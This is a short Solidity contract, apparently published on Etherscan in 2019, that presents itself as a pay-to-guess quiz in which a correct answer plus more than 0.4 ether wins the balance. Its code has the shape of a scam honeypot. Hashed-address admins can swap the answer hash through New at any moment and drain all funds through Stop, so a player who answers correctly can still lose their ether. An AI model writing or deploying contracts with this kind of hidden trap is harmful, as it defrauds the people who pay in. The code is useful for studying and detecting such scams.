/**
 *Submitted for verification at Etherscan.io on 2019-07-09
*/

pragma solidity ^0.4.25;

contract A_Game
{
    function Try(string _response) external payable 
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 0.4 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string _question, string _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] admins) public{
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;        
        }       
    }

    modifier isAdmin(){
        require(admin[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}